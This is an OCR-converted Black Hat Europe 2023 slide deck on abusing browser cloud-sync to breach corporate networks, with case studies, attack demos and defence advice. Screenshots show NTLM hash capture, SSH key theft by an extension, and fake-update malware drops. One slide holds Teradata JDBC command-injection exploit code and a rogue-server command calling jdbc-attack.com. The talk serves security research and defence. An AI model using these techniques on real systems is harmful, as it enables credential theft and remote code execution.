---
title: "Breaching the Perimeter via Cloud Synchronized Browser Settings"
speakers: ["Edward Prior"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2023"
edition: "Europe"
year: 2023
source_pdf: "Black Hat Europe 2023 slides/Edward Prior_Breaching the Perimeter via Cloud Synchronized Browser Settings.pdf"
pages: 58
sha256: "e872d1fc3268924c989d4deb3be06a1fac675e77cc80149ca2a4c68ccfda40d4"
text_chars: 17885
ocr_pages: 22
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.1
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:02:33Z"
---
# Breaching the Perimeter via Cloud Synchronized Browser Settings

**Speakers:** Edward Prior  
**Conference:** Black Hat Europe 2023  
**Source:** `Black Hat Europe 2023 slides/Edward Prior_Breaching the Perimeter via Cloud Synchronized Browser Settings.pdf` (58 pages)


## Slide 1


> Recovered by OCR — confidence 84/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DECEMBER 4-7
EXCEL LONDON / UK
#BHEU @BlackHatEvents
```

## Slide 2


> Recovered by OCR — confidence 95/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Breaching the Perimeter via Cloud
Synchronized Browser Settings
Edward Prior
#BHEU @BlackHatEvents
```

## Slide 3

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Cracking the perimeter**

User Credentials

## Slide 4

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Cracking the perimeter**

Steal Data
VPN Data Repos
Remotely
User  Business  Malware
Mail Servers Code Exec
Credentials Infra Phishing
Compromis
Compromis
e External  Cloud Infra Code Exec
e Cloud Infra
Service

## Slide 5

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

## Slide 6

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

- Credential phishing

## Slide 7

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

- Credential phishing  User interaction

## Slide 8

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

- Credential phishing  User interaction

- Malware download

## Slide 9

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

- Credential phishing  User interaction

- Malware download  User interaction

## Slide 10

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

- Credential phishing  User interaction

- Malware download  User interaction

- Cross-Site Request Forgery

## Slide 11

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

- Credential phishing  User interaction

- Malware download  User interaction

- Cross-Site Request Forgery  Context

## Slide 12

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

- Credential phishing  User interaction

- Malware download  User interaction

- Cross-Site Request Forgery  Context

- Browser Exploits

## Slide 13

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malicious Links**

What is the worst thing that can happen when a malicious link is clicked?

- Credential phishing  User interaction

- Malware download  User interaction

- Cross-Site Request Forgery  Context

- Browser Exploits  Context

## Slide 14

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

**Todays Goal** Demonstrate how cloud sync gives immense context to an attacker, and the tools to trigger remote payloads unavailable without sync.

## Slide 15

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Whoami**

- Edward Prior

- @JankhJankh

- Robotics -> Machine Learning -> Pentester/Red Teamer

- OSCP, OSCE, CRTE, ETC.

- 12 CVEs

- CTF Challenge Designer for AIV@DEF CON

## Slide 16

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Outline**

- Sync Introduction

- Case Studies

- Vuln Demos

- Prevention and Detection

- Automated Emulation

## Slide 17

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Intro to Cloudsync**

Cloudsync is a feature in every browser to allow for a consistent state between devices.

## Slide 18

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Intro to Cloudsync**

Cloudsync is a feature in every browser to allow for a consistent state between devices.

Features:

- Synced Settings, Extensions, Passwords, history, and user data

- • Periodically pulls updates from a server

## Slide 19

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Likelihood of compromise**

- M365

- Google Business Suite

• Personal browser accounts

## Slide 20

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Studies**

All case studies assume a cloud synchronised account on a corporate device has been compromised, and that the browser is being used regularly. Each case study was conducted against a fully patched Chrome, Edge, and Firefox browser.

## Slide 21

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 1: Passive Actions**

## Slide 22

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 1: Passive Actions**

## Slide 23

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 1: Passive Actions**


> Recovered by OCR — confidence 89/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 1: Passive Actions
1 saved passwords
Add password
Website | Username Password Health TL
admin Secretpassword1 S ess
"SPECIFICS": {
```

## Slide 24

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 1: Passive Actions**


> Recovered by OCR — confidence 88/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 1: Passive Actions
1 saved passwords
Add password
Website | Username Password Health TL
admin Secretpassword1 S ess
"NON_UNIQUE_! :
"SPECIFICS": {
TITLE TO SECRET SITE</a
```

## Slide 25

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 1: Passive Actions**


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 1: Passive Actions
@ Edge
1 saved passwords
Add password About Data Sync Node Browser
Refresh | Last refresh time: 26/11/2023, 9:18:46 pm
Autofill Title Autofill
Username Password Health N @ - ID null
Autonill Custom Data Modification Time null
Autofill Profiles Parent r
Is Folder true
Type Autofill
External ID null
admin Secretpassword1
Bookmarks
Collection
“ORIGINATOR_CLIENT_ITEM_ID": "",
“PARENT_ID": a Edge Hub App Usage
“SERVER_DEFINED_UNIQUE_TAG": Edge Wallet
“SPECIFICS”: {
“autofill": {
™ usage t imestamp" : [ History Delete Directives
Extension settings
Extensions
Passwords
Send Tab To Self
Sessions
Typed URLs
2024&CVV=142&sameadr r title= TI
i" target self i 1uto el referre >TITLE TO SECRET SITE</a>
User Consents
Web Apps
```

## Slide 26

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 1: Passive Actions**


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 1: Passive Actions
Profiles / Passwords
& Try the new management experience in Wallet
Offer to save passwords
Automatically save passwords
Autofill passwords
```

## Slide 27

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 2: Forced Navigation**

## Slide 28

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 2: Forced Navigation**

## Slide 29

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 2: Forced Navigation**


> Recovered by OCR — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 2: Forced Navigation
e Chrome Home TheBrowserby Google Features ~ Safety
Microsoft 365
```

## Slide 30

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 3: File Directives**

## Slide 31

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 3: File Directives**


> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 3: File Directives
2 @ Problem loading page x +
Access to the file was denied
The file at ///192.168.18.128/index.html is not readable.
* It may have been removed, moved, or file permissions may be preventing access.
NTLMv2-SSP Client : 197.168.18.129
NTLMv2-SSP Username : .\User
NTLMv2-SSP Hash : User::.:62ec61be6fd3f441: 7I
```

## Slide 32

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 3: File Directives**


> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 3: File Directives
2 @® Problem loading page x + " Index of C:\Users\ x +
Index of C:\Users\
[parent directory]
Access to the file was denied ame Sas
Default
The file at ///192.168.18.128/index.html is not readable. Default User
Jankh
e It may have been removed, moved, or file permissions may be preventing access.
Try Again
NTLMv2-SSP Client
NTLMv2-SSP Username
NTLMv2-SSP Hash
```

## Slide 33

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 3: File Directives**


> Recovered by OCR — confidence 90/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 3: File Directives
@® Problem loading page x a
@ file://///192.168.18.128/index.html
Access to the file was denied
The file at ///192.168.18.128/index.html is not readable.
e It may have been removed, moved, or file permissions may be preventing access.
Try Again
NTLMv2-SSP Client
NTLMv2-SSP Username
NTLMv2-S5SP Hash
Index of C:\Users\ x +
Index of C:\Users\
[parent directory]
Name Size
All Users
Default
Default User
Jankh
Date Modified
5 3:41:31 PM
File Edit Selection Find View Goto Tools Project Preferences Help
187 user_pref("services.sync.engine.prefs.modified", false);
188 user_pref("services.sync.forms.lastSync", "1701480680.58") ;
function user_pref(datal, data2){
< t src="file:///
```

## Slide 34

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 4: Protocol Handlers**

## Slide 35

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 4: Protocol Handlers**


> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 4: Protocol Handlers
Introducing the new Bing, yt This site is trying to open Java(TM) Web Launcher.
Ask real questions. Get complete answei A website wants to open this application.
Microsoft Microsoft 365 Teams
a www.microsoft.com,
Introducing the new Bing, your Al-powered search engine.
Ask real questions. Get complete Chat and create
Do you want to run this application?
Microsoft Mic
Name: Notepad
Publisher: Oracle America, Inc
This application will run with unrestricted access which may put your computer and personal
information at risk. Run this application only if you trust the location and publisher above.
Do not show this again for apps from the publisher and location above
```

## Slide 36

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 5: Malicious Extensions**

## Slide 37

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Case Study 5: Malicious Extensions**


> Recovered by OCR — confidence 86/100 on the text kept, 50/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Case Study 5: Malicious Extensions
CGC A
@ File
LXiHJw3YpBoUnhxXr@s3K9VYItHCOS289PuP16UL9QR5VCDh
IK59voQ@0yBSp5B4/02aLu+gbfQz8/ivZaLUKrG4ZW/KGhit
C:/Users/User/.ssh/id_rsa
This page says
MXJaWGt0ZGpFQUFBQUFCRzV2Y
ndGNuCk50QUFBQUF3RUFBUUFBQVIFQ
Z2NCRZBCdHFNcIkKK3VrMkxrR
```

## Slide 38

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Summary Of Case Studies**

- Information Theft

- Full control of victim URLs

- Auth coercion

- Viewing local and remote files

- The ability to trigger external applications

## Slide 39

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Attacks**

## Slide 40

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Forced Password Theft in Edge**


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Forced Password Theft in Edge
Offer to save passwords
w Microsoft Edge to si
utomatically save passwords
Autofill passwords
n Microsoft Edge to automat
More settings Vv
www.facebook.com
f Q Search Facebook Saved password automatically
Microsoft Edge will save this password to your
Microsoft account
s& Stoy Stunsen Create Story auhdiaudsid|
Share a photo or write something,
7 Castles Place, Melba,
Australian Capital Territory
2615
raywhitecanberr
es Find friends
LS) Feeds s What's on your mind, Stoy?
@ Groups
Live video (a Photo/video © Feeling/activity @ Limit 1 ry
imit 1 per person
```

## Slide 41

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Sensitive File Theft via Extensions**

Malicious User is sent to Extension Reads User is redirected User starts browser C:/Users/User/.ssh the page and to their homepage. /id_rsa exfiltrates data

## Slide 42

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Sensitive File Theft from Share Drive**


> Recovered by OCR — confidence 94/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Sensitive File Theft from Share Drive
+
windev2308eval
https
[parent directory]
Name Size Date modified
screensavers 29/10/2023, 07:27:0
vpnsetup. bat 22B 29/10/2023, 07:33:
vpnsetup.bat
vpnsetup.ps1
```

## Slide 43

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Sensitive File Theft from Share Drive**


> Recovered by OCR — confidence 80/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Sensitive File Theft from Share Drive
\\192.168.18.128\demoshare x =e
S aN g @ > Network > 192.168.18.128 > demoshare Search demoshare Q
@ New WN. Sort C3 Details
@ Roy - Personal |
€ > GA @ File | 192.168.18.128/d
Test Share Drive Exfiltration
Q tpy © Default levels ¥ @7
accessibility.typeaheadfind.flashBar
app.installation.timestamp
133408090843795707
```

## Slide 44

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malware Dropping Via XSS**


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Malware Dropping Via XSS
@ How to update - Google Chro x +
ing Sta //google.com/ //google.com/ ported . —
® Getting Started @ https://google.com/1 https://google.com/2 Imported From Fire. ] ChromeUpdate.exe
Chrome Home TheBrowserby Google Features v Safety v
Google uses cookies to deliver its services, to personalise ads, and to analyse traffic. You can adjust your privacy controls anytime in your Google sett
Chrome keeps you up
to date
Chrome updates happen in the background automatically —
keeping you running smoothly and securely with the latest features.
Ok, got it
```

## Slide 45

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Malware Dropping Via DOM Modification**

## Slide 46

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **RCE via Protocol Handler Vuln**


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
RCE via Protocol Handler Vuln
@ Untitled x +
@ Getting Started @ https://googlecom/1 G ht
Open Windows Command Processor?
A website wants to open this application.
Open Windows Command Processor
```

## Slide 47

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Leveraging Credentials and Context**


> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Leveraging Credentials and Context
Oo
Ga
C2 Import favorites
@ New tat
SE Microsoft Start
Yesterday - Friday, No
Microsoft account
1 saved passwords
Website J Username Password Health
admin etpassword1
```

## Slide 48

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Leveraging Credentials and Context**


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Leveraging Credentials and Context
© (ts) al Apache Tomcat/9.0.82
G Aa
Calculator
Standard 59
Home Doc Find Help
Apache T APACHE
Server Status
Manager App
Host Manager
Developer ¢
Tomcat Setup Servlet Specifications
First Web Appli Tomcat Versions
Managing Getting Help
For security, aq , FAQ and Mailing Lists
```

## Slide 49

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Desktop Credential Compromise**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Teradata JDBC Driver Remote Code Execution via SSO Command Injection

[code editor]
import java.sql.DriverManager;
import java.sql.SQLException;

public class TeradataDemo {
    public static void main(String[] args) throws SQLException {

        DriverManager.registerDriver(new com.teradata.jdbc.TeraDriver());

        DriverManager.getConnection( url: "jdbc:teradata://127.0.0.1/DBS_PORT=10250,LOGMECH=BROWSER,BROWSER='open -a calculator',TYPE=DEFAULT,COP=OFF,TMODE=TERA,LOG=DEBUG");
    }
}

[terminal — title bar: python3 -u rogue_teradata_server.py -p 10250 -u]
pyn3rd@MacBookPro ~/ssl python3 -u rogue_teradata_server.py -p 10250 -u 'https://jdbc-attack.com/teradata'
04/14/2023 11:40:38 AM [+]Connecting from IP: 127.0.0.1, Port: 54400
04/14/2023 11:40:38 AM [+]Data received: b'\x03\x01\n\x00\x00\x07\x00\x00\x00C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[...]\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00C\x00\x00\x00\x01\x00\x02\x00\x04\x11\x14\x00\x0c\x00\x01\x00[...]\x01\x01\x00\x03\x00\x00\x00\x05\x00\x00\x00\t\x00\x01\x01\x00\x0b\x00\x01\x01\x00\x0e\x00\x00\x00\x0f\x00\x00'
04/14/2023 11:40:38 AM [+]Data sending: b'\x03\x02\n\x00\x00\x07\x00\x00\x03\xa3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[...]\x00\x05\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00+\x02N\x00\x00\x03\xe8\x00\x00\x03\xe8\x00x\x00\x01w\xff\x00\x00\x0[...]

[IDE Run panel — com.example.jdbc.attack.db2.TeradataDemo; a Calculator window overlaps and obscures the middle of each log line]
2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_[obscured]rce
2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_[obscured]sIdProURL=https://jdbc-attack.com/teradata/.well-known/openid-configuration
2023-04-14.11:41:37.561 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_[obscured]SocketFactory: sHTTPSProtocol=TLSv1.2
2023-04-14.11:41:37.562 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_[obscured]SocketFactory: sm_socketFactory.getDefaultCipherSuites=[TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA2[...]
2023-04-14.11:41:38.098 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6.JDK6_SQL[obscured]g https://jdbc-attack.com/teradata/.well-known/openid-configuration took 567 ms and completed
2023-04-14.11:41:38.098 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6.JDK6_SQL[obscured]HttpServer with Browser Authentication timeout 180000 ms and browser tab timeout 5000 ms
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL[obscured]authorization_endpoint": "foo", "token_endpoint": "bar" }
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [Thread-4] com.teradata.jdbc.jdk6.JDK6_[obscured]erver Listening on port 54470
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL[obscured]foo
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_Connection@16ec5519 sTokenURL=bar
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_Connection@16ec5519 sCodeVerifier=I5WVBKwIQdjFEqKv4a0zwD2VOt03mZbWjugnKigLXRM
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_Connection@16ec5519 sCodeChallenge=JAnKkqTFPzdb4msp1jglHDBTouI1BaGltHNFevtqJ9Y
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_Connection@16ec5519 sRedirectURL=http://localhost:54470/openid-callback
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_Connection@16ec5519 sOIDCScope=openid
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_Connection@16ec5519 (before PLACEHOLDER swap) sBrowser=open -a calculator
2023-04-14.11:41:38.102 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6.JDK6_SQL_Connection@16ec5519 Launching browser open -a calculator
```

## Slide 50

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **RCE via WinRM Request Forgery**


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
RCE via WinRM Request Forgery
© 0 O Not Found
fa Calculator
= Standard 59
Not Found
HTTP Error 404. The requested resource is not found.
```

## Slide 51

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Lateral Movement**


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Lateral Movement
User > AppData > Local > Mozilla > Firefox > Profiles
Name Date modified Type
Quick access
9x22n1oc.default
File folder
@ OneDrive - Personal FirefoxSync
~@ This PC kzdgxsxs.default-release
File folder
yzvj2z34.EdgeSync File folder
```

## Slide 52

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Summary of Attacks**

- Information Theft

- Full control of victim URLs

- Auth coercion

- Viewing local and remote files

- The ability to trigger external applications

- Request Forgery attacks that circumvent SOP.

- Lateral movement

## Slide 53

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Prevention**

Disable setting sync on all browsers at a both a cloud and device level.

Harden browser settings via group policy.

<u>Decouple your password manager from your browser.</u>

Other recommendations:

- Investigate any other browsers in use in the organisation.

- Investigate if personal browser accounts are being used within the organisation.

## Slide 54

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Detection**

Alert on anomalous logins and actions within your external services. Periodically scan your enterprise for malicious extensions. Investigate anomalous browser subprocessess. Alert on excessive network activity (port scanning).

## Slide 55

**INTRO**

**AUTOMATION**

**CASE STUDIES**

**ATTACKS**

**DEFENCE**

# **Automated Emulation**

## Automated emulation tool written in .NET.

Enables Sync In Malicious Browsers, and adds Periodically Opens Extension Reads a malicious the Browser the sync config to extension inform attacks Conducts malicious activity

https://github.com/JankhJankh/Syncy

## Slide 56

**Conclusion / Black Hat Europe Sound Bytes** Sync provides remote attackers with significant context into an enterprise environment, and some unique ways of leveraging that context to crack the perimeter.

## Slide 57

**Conclusion / Black Hat Europe Sound Bytes** Sync provides remote attackers with significant context into an enterprise environment, and some unique ways of leveraging that context to crack the perimeter.

Disable sync in enterprise environments.

Consider Syncy for your next attack simulation.

## Slide 58

# **Questions?**

Edward Prior at Aegis9 Socials: @JankhJankh Syncy: https://github.com/JankhJankh/Syncy Whitepaper: Available on briefing page
